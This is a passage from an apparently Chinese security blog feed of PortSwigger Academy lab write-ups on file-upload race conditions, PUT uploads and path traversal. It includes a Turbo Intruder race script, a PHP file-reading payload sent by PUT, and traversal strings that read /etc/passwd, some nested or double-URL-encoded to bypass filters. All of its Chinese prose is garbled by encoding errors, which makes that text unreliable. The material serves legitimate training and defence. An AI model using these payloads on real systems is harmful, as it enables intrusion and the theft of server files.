<p>é¦–å…ˆä¸Šä¼ å›¾ç‰‡ï¼Œç„¶åæ·»åŠ è·¯å¾„è®¿é—®å›¾ç‰‡ï¼Œç¡®ä¿è®¿é—®è·¯å¾„æ­£ç¡®</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250507101849368.png" alt="image-20250507101849368"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç„¶åæ„é€ Tburbo Intruderæ–‡ä»¶ä¸Šä¼ ç«èµ›è„šæœ¬è¿›è¡Œæ”»å‡»ï¼Œè„šæœ¬å¦‚ä¸‹</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=<span class="number">10</span>,)</span><br><span class="line"></span><br><span class="line">    request1 = <span class="string">&#x27;&#x27;&#x27;&lt;YOUR-POST-REQUEST&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    request2 = <span class="string">&#x27;&#x27;&#x27;&lt;YOUR-GET-REQUEST&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the &#x27;gate&#x27; argument blocks the final byte of each request until openGate is invoked</span></span><br><span class="line">    engine.queue(request1, gate=<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        engine.queue(request2, gate=<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wait until every &#x27;race1&#x27; tagged request is ready</span></span><br><span class="line">    <span class="comment"># then send the final byte of each request</span></span><br><span class="line">    <span class="comment"># (this method is non-blocking, just like queue)</span></span><br><span class="line">    engine.openGate(<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    engine.complete(timeout=<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    table.add(req)</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>å°†request1è®¾ç½®ä¸ºä¸Šä¼ phpä»£ç çš„åŒ…ï¼Œå°†request2è®¾ç½®ä¸ºä¸Šä¼ çš„phpä»£ç çš„è·¯å¾„ã€‚</p>
</li>
</ul>
<p><img src="/posts/34bab347//image-20250507102639395.png" alt="image-20250507102639395"></p>
<h4 id="åŸºäº-URL-çš„æ–‡ä»¶ä¸Šä¼ ä¸­çš„ç«èµ›æ¡ä»¶">åŸºäº URL çš„æ–‡ä»¶ä¸Šä¼ ä¸­çš„ç«èµ›æ¡ä»¶</h4>
<p>åœ¨å…è®¸æ‚¨é€šè¿‡æä¾› URL ä¸Šä¼ æ–‡ä»¶çš„å‡½æ•°ä¸­ï¼Œä¹Ÿä¼šå‡ºç°ç±»ä¼¼çš„ç«èµ›æ¡ä»¶ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨å¿…é¡»é€šè¿‡äº’è”ç½‘è·å–æ–‡ä»¶å¹¶åˆ›å»ºæœ¬åœ°å‰¯æœ¬ï¼Œç„¶åæ‰èƒ½æ‰§è¡Œä»»ä½•éªŒè¯ã€‚</p>
<p>ç”±äºæ–‡ä»¶æ˜¯ä½¿ç”¨ HTTP åŠ è½½çš„ï¼Œå¼€å‘äººå‘˜æ— æ³•ä½¿ç”¨æ¡†æ¶çš„å†…ç½®æœºåˆ¶æ¥å®‰å…¨åœ°éªŒè¯æ–‡ä»¶ã€‚ç›¸åï¼Œä»–ä»¬å¯èƒ½ä¼šæ‰‹åŠ¨åˆ›å»ºè‡ªå·±çš„æµç¨‹æ¥ä¸´æ—¶å­˜å‚¨å’ŒéªŒè¯æ–‡ä»¶ï¼Œä½†è¿™æ ·å¯èƒ½ä¸å¤ªå®‰å…¨ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœæ–‡ä»¶è¢«åŠ è½½åˆ°ä¸€ä¸ªåç§°éšæœºçš„ä¸´æ—¶ç›®å½•ä¸­ï¼Œç†è®ºä¸Šæ”»å‡»è€…å°±ä¸å¯èƒ½åˆ©ç”¨ä»»ä½•ç«èµ›æ¡ä»¶ã€‚å¦‚æœæ”»å‡»è€…ä¸çŸ¥é“ç›®å½•åï¼Œå°±æ— æ³•è¯·æ±‚æ–‡ä»¶ä»¥è§¦å‘æ–‡ä»¶çš„æ‰§è¡Œã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœä½¿ç”¨ä¼ªéšæœºå‡½æ•°ï¼ˆå¦‚ PHP çš„ uniqid()ï¼‰ç”Ÿæˆéšæœºç›®å½•åï¼Œå°±æœ‰å¯èƒ½è¢«æš´åŠ›ç ´è§£ã€‚</p>
<p>ä¸ºäº†è®©è¿™ç§æ”»å‡»æ›´å®¹æ˜“å¾—æ‰‹ï¼Œå¯ä»¥å°è¯•å»¶é•¿å¤„ç†æ–‡ä»¶çš„æ—¶é—´ï¼Œä»è€Œå»¶é•¿æš´åŠ›ç ´è§£ç›®å½•åçš„æ—¶é—´çª—å£ã€‚ä¸€ç§æ–¹æ³•æ˜¯ä¸Šä¼ è¾ƒå¤§çš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶æ˜¯åˆ†å—å¤„ç†çš„ï¼Œä½ å°±æœ‰å¯èƒ½åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œåˆ›å»ºä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶å¼€å¤´æ·»åŠ æœ‰æ•ˆè½½è·ï¼Œç„¶åæ·»åŠ å¤§é‡ä»»æ„å¡«å……å­—èŠ‚ã€‚</p>
<h2 id="åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´è€Œä¸æ‰§è¡Œè¿œç¨‹ä»£ç ">åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´è€Œä¸æ‰§è¡Œè¿œç¨‹ä»£ç </h2>
<p>åœ¨æˆ‘ä»¬è¿„ä»Šä¸ºæ­¢çœ‹è¿‡çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ æœåŠ¡å™¨ç«¯è„šæœ¬ä»¥è¿œç¨‹æ‰§è¡Œä»£ç ã€‚è¿™æ˜¯æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ä¸å®‰å…¨é€ æˆçš„æœ€ä¸¥é‡åæœï¼Œä½†è¿™äº›æ¼æ´ä»ç„¶å¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼è¢«åˆ©ç”¨ã€‚</p>
<h3 id="ä¸Šä¼ æ¶æ„å®¢æˆ·ç«¯è„šæœ¬">ä¸Šä¼ æ¶æ„å®¢æˆ·ç«¯è„šæœ¬</h3>
<p>è™½ç„¶æ‚¨å¯èƒ½æ— æ³•åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œè„šæœ¬ï¼Œä½†æ‚¨ä»ç„¶å¯ä»¥ä¸Šä¼ è„šæœ¬è¿›è¡Œå®¢æˆ·ç«¯æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå¯ä»¥ä¸Šä¼  HTML æ–‡ä»¶æˆ– SVG å›¾åƒï¼Œå°±æœ‰å¯èƒ½ä½¿ç”¨ &lt;script&gt; æ ‡è®°åˆ›å»ºå­˜å‚¨çš„ XSS æœ‰æ•ˆè½½è·ã€‚</p>
<p>å¦‚æœä¸Šä¼ çš„æ–‡ä»¶å‡ºç°åœ¨å…¶ä»–ç”¨æˆ·è®¿é—®çš„é¡µé¢ä¸Šï¼Œä»–ä»¬çš„æµè§ˆå™¨åœ¨å°è¯•å‘ˆç°é¡µé¢æ—¶å°±ä¼šæ‰§è¡Œè„šæœ¬ã€‚è¯·æ³¨æ„ï¼Œç”±äºåŒæºç­–ç•¥çš„é™åˆ¶ï¼Œè¿™ç±»æ”»å‡»åªæœ‰åœ¨ä¸Šä¼ çš„æ–‡ä»¶å’Œæ‚¨ä¸Šä¼ æ–‡ä»¶çš„åŒä¸€æºæä¾›æ—¶æ‰ä¼šèµ·ä½œç”¨ã€‚</p>
<p>èƒ½ä¸Šä¼ å¸¦æœ‰æ¶æ„ä»£ç çš„æ–‡ä»¶æ˜¯æœ€ä¸¥é‡çš„æ¼æ´ï¼Œè¿™æ˜¯é’ˆå¯¹æœåŠ¡å™¨çš„æ”»å‡»ï¼Œä½†æ–‡ä»¶ä¸Šä¼ ä¹Ÿèƒ½ç”¨äºé’ˆå¯¹å®¢æˆ·ç«¯æ”»å‡»ã€‚ä¸Šä¼ ä¸€ä¸ª HTML  æ–‡ä»¶æˆ– SVG å›¾åƒï¼Œé‡Œé¢åŒ…å« XSS ä»£ç ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæ˜¯ä¸€ä¸ªå­˜å‚¨å‹ XSS æ¼æ´äº†ï¼Œç„¶åæŠŠæ–‡ä»¶çš„ URL  å‘ç»™å—å®³è€…ï¼Œå› ä¸ºåŸŸåæ˜¯åˆæ³•çš„ï¼Œæ‰€ä»¥æ›´å®¹æ˜“è¢«ä¿¡ä»»ã€‚ï¼ˆæ³¨æ„ï¼Œä¸Šä¼ çš„æ–‡ä»¶å¦‚æœè¢«ä¿å­˜åˆ°å¦ä¸€ä¸ªç½‘ç«™ï¼Œé‚£ä¹ˆè¦è€ƒè™‘åŒæºç­–ç•¥çš„å½±å“ï¼‰</p>
<h3 id="ä½¿ç”¨-PUT-ä¸Šä¼ æ–‡ä»¶">ä½¿ç”¨ PUT ä¸Šä¼ æ–‡ä»¶</h3>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸäº›ç½‘ç»œæœåŠ¡å™¨å¯èƒ½è¢«é…ç½®ä¸ºæ”¯æŒ PUT è¯·æ±‚ã€‚å¦‚æœæ²¡æœ‰é€‚å½“çš„é˜²å¾¡æªæ–½ï¼Œå³ä½¿ç½‘ç»œæ¥å£æ²¡æœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼ä¸Šä¼ æ¶æ„æ–‡ä»¶ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PUT /images/exploit.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-httpd-php</span><br><span class="line">Content-Length: <span class="number">49</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/path/to/file&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Tip">Tip</h3>
<p>æ‚¨å¯ä»¥å°è¯•å‘ä¸åŒçš„ç«¯ç‚¹å‘é€ OPTIONS è¯·æ±‚ï¼Œä»¥æµ‹è¯•æ˜¯å¦æœ‰ä»»ä½•ç«¯ç‚¹å®£å¸ƒæ”¯æŒ PUT æ–¹æ³•ã€‚</p>
<h2 id="å¦‚ä½•é˜²æ­¢æ–‡ä»¶ä¸Šä¼ æ¼æ´">å¦‚ä½•é˜²æ­¢æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2>
<p>å…è®¸ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶å·²æ˜¯å¸ç©ºè§æƒ¯çš„äº‹æƒ…ï¼Œåªè¦é‡‡å–æ­£ç¡®çš„é¢„é˜²æªæ–½ï¼Œå°±ä¸ä¼šæœ‰ä»€ä¹ˆå±é™©ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¿æŠ¤è‡ªå·±çš„ç½‘ç«™å…å—è¿™äº›æ¼æ´æ”»å‡»çš„æœ€æœ‰æ•ˆæ–¹æ³•æ˜¯å®æ–½ä»¥ä¸‹æ‰€æœ‰åšæ³•ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>å¯¹ç…§å…è®¸æ‰©å±•åçš„ç™½åå•è€Œä¸æ˜¯ç¦æ­¢æ‰©å±•åçš„é»‘åå•æ£€æŸ¥æ–‡ä»¶æ‰©å±•åã€‚çŒœæµ‹ä½ å¯èƒ½å¸Œæœ›å…è®¸å“ªäº›æ‰©å±•åè¦æ¯”çŒœæµ‹æ”»å‡»è€…å¯èƒ½è¯•å›¾ä¸Šä¼ å“ªäº›æ‰©å±•åå®¹æ˜“å¾—å¤šã€‚</p>
</li>
<li class="lvl-2">
<p>ç¡®ä¿æ–‡ä»¶åä¸åŒ…å«ä»»ä½•å¯èƒ½è¢«è§£é‡Šä¸ºç›®å½•æˆ–éå†åºåˆ—ï¼ˆâ€¦/ï¼‰çš„å­ä¸²ã€‚</p>
</li>
<li class="lvl-2">
<p>é‡æ–°å‘½åä¸Šä¼ çš„æ–‡ä»¶ï¼Œé¿å…å¯èƒ½å¯¼è‡´ç°æœ‰æ–‡ä»¶è¢«è¦†ç›–çš„ç¢°æ’ã€‚</p>
</li>
<li class="lvl-2">
<p>åœ¨å®Œå…¨éªŒè¯ä¹‹å‰ï¼Œä¸è¦å°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„æ°¸ä¹…æ–‡ä»¶ç³»ç»Ÿã€‚</p>
</li>
<li class="lvl-2">
<p>å°½å¯èƒ½ä½¿ç”¨å·²å»ºç«‹çš„æ¡†æ¶æ¥é¢„å¤„ç†æ–‡ä»¶ä¸Šä¼ ï¼Œè€Œä¸æ˜¯å°è¯•ç¼–å†™è‡ªå·±çš„éªŒè¯æœºåˆ¶ã€‚</p>
</li>
</ul>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<p><a href="https://blog.csdn.net/shawdow_bug/article/details/140149569">ã€Portswigger å­¦é™¢ã€‘æ–‡ä»¶ä¸Šä¼ </a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é¶åœºç»ƒä¹ </category>
      </categories>
      <tags>
        <tag>PortSwiggeré¶åœº</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>ã€PortSwiggerå­¦é™¢ã€‘è·¯å¾„éå†</title>
    <url>/posts/15b3971d/</url>
    <content><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯è·¯å¾„éå†">ä»€ä¹ˆæ˜¯è·¯å¾„éå†</h2>
<p>è·¯å¾„éå†ä¹Ÿç§°ä¸ºç›®å½•éå†ã€‚è¿™äº›æ¼æ´å¯ä½¿æ”»å‡»è€…åœ¨è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šè¯»å–ä»»æ„æ–‡ä»¶ã€‚è¿™å¯èƒ½åŒ…æ‹¬ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>åº”ç”¨ç¨‹åºä»£ç å’Œæ•°æ®</p>
</li>
<li class="lvl-2">
<p>åç«¯ç³»ç»Ÿçš„å‡­è¯</p>
</li>
<li class="lvl-2">
<p>æ•æ„Ÿçš„æ“ä½œç³»ç»Ÿæ–‡ä»¶ã€‚</p>
</li>
</ul>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿå†™å…¥æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ï¼Œä»è€Œä¿®æ”¹åº”ç”¨ç¨‹åºæ•°æ®æˆ–è¡Œä¸ºï¼Œå¹¶æœ€ç»ˆå®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚</p>
<span id="more"></span>
<h2 id="é€šè¿‡è·¯å¾„éå†è¯»å–ä»»æ„æ–‡ä»¶">é€šè¿‡è·¯å¾„éå†è¯»å–ä»»æ„æ–‡ä»¶</h2>
<h3 id="Lab-File-path-traversal-simple-case">Lab: File path traversal, simple case</h3>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä¸€ä¸ªè´­ç‰©åº”ç”¨ç¨‹åºä¼šæ˜¾ç¤ºå¾…å”®å•†å“çš„å›¾ç‰‡ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ HTML åŠ è½½å›¾ç‰‡ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/loadImage?filename=218.png&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>loadImage </code>URL æ¥æ”¶ä¸€ä¸ª<code>filename</code>å‚æ•°ï¼Œå¹¶è¿”å›æŒ‡å®šæ–‡ä»¶çš„å†…å®¹ã€‚å›¾åƒæ–‡ä»¶å­˜å‚¨åœ¨ç£ç›˜çš„ <code>/var/www/images/</code>  ç›®å½•ä¸­ã€‚è¦è¿”å›å›¾åƒï¼Œåº”ç”¨ç¨‹åºä¼šå°†è¯·æ±‚çš„æ–‡ä»¶åè¿½åŠ åˆ°è¯¥åŸºæœ¬ç›®å½•ï¼Œå¹¶ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿ API è¯»å–æ–‡ä»¶å†…å®¹ã€‚æ¢å¥è¯è¯´ï¼Œåº”ç”¨ç¨‹åºä¼šä»ä»¥ä¸‹æ–‡ä»¶è·¯å¾„è¯»å–å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/www/images/218.png</span><br></pre></td></tr></table></figure>
<p>è¯¥åº”ç”¨ç¨‹åºæ²¡æœ‰é’ˆå¯¹è·¯å¾„éå†æ”»å‡»å®æ–½ä»»ä½•é˜²å¾¡æªæ–½ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥è¯·æ±‚ä»¥ä¸‹ URLï¼Œä»æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸­æ£€ç´¢ /etc/passwd æ–‡ä»¶ï¼š</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=../</span>..<span class="regexp">/../</span>etc/passwd</span><br></pre></td></tr></table></figure>
<p>è¿™å°†å¯¼è‡´åº”ç”¨ç¨‹åºä»ä»¥ä¸‹æ–‡ä»¶è·¯å¾„è¯»å–æ•°æ®ï¼š</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/var/</span>www<span class="regexp">/images/</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
<p><code>../</code>åºåˆ—åœ¨æ–‡ä»¶è·¯å¾„ä¸­æœ‰æ•ˆï¼Œè¡¨ç¤ºåœ¨ç›®å½•ç»“æ„ä¸­ä¸Šç§»ä¸€çº§ã€‚è¿ç»­ä¸‰ä¸ª<code>../</code>é¡ºåºä» <code>/var/www/images/ </code>ä¸Šç§»åˆ°æ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ï¼Œå› æ­¤å®é™…è¯»å–çš„æ–‡ä»¶æ˜¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure>
<p>åœ¨åŸºäº Unix çš„æ“ä½œç³»ç»Ÿä¸Šï¼Œè¿™æ˜¯ä¸€ä¸ªæ ‡å‡†æ–‡ä»¶ï¼ŒåŒ…å«æœåŠ¡å™¨ä¸Šæ³¨å†Œç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ï¼Œä½†æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æŠ€æœ¯æ£€ç´¢å…¶ä»–ä»»æ„æ–‡ä»¶ã€‚</p>
<p>åœ¨ Windows ç³»ç»Ÿä¸­ï¼Œâ€¦/ å’Œ â€¦\éƒ½æ˜¯æœ‰æ•ˆçš„ç›®å½•éå†åºåˆ—ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªé’ˆå¯¹åŸºäº Windows çš„æœåŠ¡å™¨çš„ç­‰æ•ˆæ”»å‡»ç¤ºä¾‹ï¼š</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">https:<span class="string">//insecure-website.com/loadImage</span>?filename=<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\windows\win.ini</span><br></pre></td></tr></table></figure>
<p>è¯¥å®éªŒå®¤åœ¨æ˜¾ç¤ºäº§å“å›¾åƒæ—¶å­˜åœ¨è·¯å¾„éå†æ¼æ´ã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·æ£€ç´¢ <code>/etc/passwd </code>æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p><img src="/posts/15b3971d//image-20250430160204983.png" alt="image-20250430160204983"></p>
<p>è¿™ä¸€é¢˜å¾ˆç®€å•ã€‚æŠŠå‚æ•°æ”¹ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p>
<h2 id="åˆ©ç”¨è·¯å¾„éå†æ¼æ´çš„å¸¸è§éšœç¢">åˆ©ç”¨è·¯å¾„éå†æ¼æ´çš„å¸¸è§éšœç¢</h2>
<h3 id="Lab-File-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">Lab: File path traversal, traversal sequences blocked with absolute path bypass</h3>
<p>è®¸å¤šå°†ç”¨æˆ·è¾“å…¥ç½®å…¥æ–‡ä»¶è·¯å¾„çš„åº”ç”¨ç¨‹åºéƒ½æœ‰é’ˆå¯¹è·¯å¾„éå†æ”»å‡»çš„é˜²å¾¡æªæ–½ã€‚è¿™äº›é˜²å¾¡æªæ–½å¾€å¾€å¯ä»¥è¢«ç»•è¿‡ã€‚</p>
<p>å¦‚æœåº”ç”¨ç¨‹åºä»ç”¨æˆ·æä¾›çš„æ–‡ä»¶åä¸­åˆ é™¤æˆ–é˜»æ­¢ç›®å½•éå†åºåˆ—ï¼Œå°±æœ‰å¯èƒ½åˆ©ç”¨å„ç§æŠ€æœ¯ç»•è¿‡é˜²å¾¡ã€‚</p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ä¸‹çš„ç»å¯¹è·¯å¾„ï¼ˆå¦‚ <code>filename=/etc/passwd</code>ï¼‰æ¥ç›´æ¥å¼•ç”¨æ–‡ä»¶ï¼Œè€Œæ— éœ€ä½¿ç”¨ä»»ä½•éå†åºåˆ—ã€‚</p>
<p>è¯¥å®éªŒå®¤åœ¨æ˜¾ç¤ºäº§å“å›¾åƒæ—¶å­˜åœ¨è·¯å¾„éå†æ¼æ´ã€‚åº”ç”¨ç¨‹åºä¼šé˜»æ­¢éå†åºåˆ—ï¼Œä½†ä¼šå°†æ‰€æä¾›çš„æ–‡ä»¶åè§†ä¸ºé»˜è®¤å·¥ä½œç›®å½•çš„ç›¸å¯¹æ–‡ä»¶åã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·æ£€ç´¢ /etc/passwd æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>è¿™é“é¢˜é˜»æ­¢äº†ç›¸å¯¹ç›®å½•éå†åºåˆ—ï¼Œä½†æ˜¯å¯ä»¥ç”¨ç»å¯¹è·¯å¾„</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430162204471.png" alt="image-20250430162204471"></p>
<h3 id="Lab-File-path-traversal-traversal-sequences-stripped-non-recursively">Lab: File path traversal, traversal sequences stripped non-recursively</h3>
<p>æ‚¨æˆ–è®¸å¯ä»¥ä½¿ç”¨åµŒå¥—éå†åºåˆ—ï¼Œå¦‚ â€¦// æˆ– â€¦//ã€‚å½“å†…éƒ¨åºåˆ—è¢«å‰¥ç¦»æ—¶ï¼Œè¿™äº›åºåˆ—ä¼šæ¢å¤ä¸ºç®€å•çš„éå†åºåˆ—ã€‚</p>
<p>è¯¥å®éªŒå®¤åœ¨æ˜¾ç¤ºäº§å“å›¾åƒæ—¶å­˜åœ¨è·¯å¾„éå†æ¼æ´ã€‚åœ¨ä½¿ç”¨ç”¨æˆ·æä¾›çš„æ–‡ä»¶åä¹‹å‰ï¼Œåº”ç”¨ç¨‹åºä¼šä»è¯¥æ–‡ä»¶åä¸­åˆ é™¤è·¯å¾„éå†åºåˆ—ã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·æ£€ç´¢ /etc/passwd æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ä½¿ç”¨<code>....//....//....//etc//passwd</code>éå†æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯<code>//etc//passwd</code>ä¸è¡Œã€‚</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430163057050.png" alt="image-20250430163057050"></p>
<h3 id="Lab-File-path-traversal-traversal-sequences-stripped-with-superfluous-URL-decode">Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</h3>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¾‹å¦‚åœ¨ URL è·¯å¾„æˆ–<code>multipart/form-data</code>  è¯·æ±‚çš„<code>filename</code>å‚æ•°ä¸­ï¼Œç½‘ç»œæœåŠ¡å™¨å¯èƒ½ä¼šåœ¨å°†æ‚¨çš„è¾“å…¥ä¼ é€’ç»™åº”ç”¨ç¨‹åºä¹‹å‰å»æ‰ä»»ä½•ç›®å½•éå†åºåˆ—ã€‚æœ‰æ—¶ï¼Œæ‚¨å¯ä»¥é€šè¿‡ URL ç¼–ç ï¼Œç”šè‡³æ˜¯åŒé‡ URL  ç¼–ç æ¥ç»•è¿‡è¿™ç§æ¸…ç†ã€‚è¿™å°†åˆ†åˆ«å¯¼è‡´ <code>%2e%2e%2f</code> å’Œ <code>%252e%252e%252f</code>ã€‚å„ç§éæ ‡å‡†ç¼–ç ï¼Œå¦‚ <code>..%c0%af</code> æˆ–  <code>..%ef%bc%8f</code> ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚</p>
<p>è¯¥å®éªŒå®¤åœ¨æ˜¾ç¤ºäº§å“å›¾åƒæ—¶å­˜åœ¨è·¯å¾„éå†æ¼æ´ã€‚åº”ç”¨ç¨‹åºä¼šé˜»æ­¢åŒ…å«è·¯å¾„éå†åºåˆ—çš„è¾“å…¥ã€‚ç„¶ååœ¨ä½¿ç”¨è¾“å…¥ä¹‹å‰å¯¹å…¶è¿›è¡Œ URL è§£ç ã€‚è¦è§£å†³æœ¬å®éªŒé—®é¢˜ï¼Œè¯·æ£€ç´¢ /etc/passwd æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>urlå•å±‚ç¼–ç è®¿é—®å¤±è´¥ï¼ŒåŒé‡ç¼–ç æˆåŠŸã€‚æœåŠ¡å™¨ä¼šå¯¹HTTPè¯·æ±‚åŒé‡urlè§£ç ã€‚è¿™é‡ŒæŠŠ<code>../</code>æ¢æˆ<code>%252e%252e%252f</code>æˆ–è€…<code>..%252f</code>å°±å¯ä»¥äº†ã€‚</p>
</li>
</ul>
<p><img src="/posts/15b3971d//image-20250430165746276.png" alt="image-20250430165746276"></p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        ä¸ºä»€ä¹ˆæœåŠ¡å™¨ä¼šè¿›è¡ŒåŒé‡è§£ç ï¼Ÿ
    </div>
    <div class="spoiler-content">
        <p>å¯èƒ½çš„æƒ…å†µæ˜¯ï¼ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚çš„æ—¶å€™ï¼Œå¯èƒ½åœ¨ä¸åŒçš„å±‚æ¬¡ä¸Šå¤šæ¬¡è¿›è¡ŒURLè§£ç ã€‚æ¯”å¦‚ï¼ŒWebæœåŠ¡å™¨ï¼ˆå¦‚Apacheæˆ–Nginxï¼‰å¯èƒ½å…ˆè¿›è¡Œä¸€æ¬¡è§£ç ï¼Œç„¶ååº”ç”¨æ¡†æ¶ï¼ˆå¦‚PHPã€Pythonçš„Flaskç­‰ï¼‰å¯èƒ½å†è¿›è¡Œä¸€æ¬¡è§£ç ã€‚å¦‚æœä¸¤æ¬¡è§£ç ä¹‹é—´æ²¡æœ‰å¯¹è·¯å¾„è¿›è¡Œæ­£ç¡®çš„è§„èŒƒåŒ–æˆ–å®‰å…¨æ£€æŸ¥ï¼Œå°±ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡åŒé‡ç¼–ç ç»•è¿‡ä¸€äº›å®‰å…¨æ£€æµ‹ã€‚</p>

    </div>
</div>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        æœ‰æ²¡æœ‰å¯èƒ½åªè§£ç ä¸€æ¬¡æˆ–è€…æ›´å¤šæ¬¡ï¼Ÿ
    </div>
    <div class="spoiler-content">
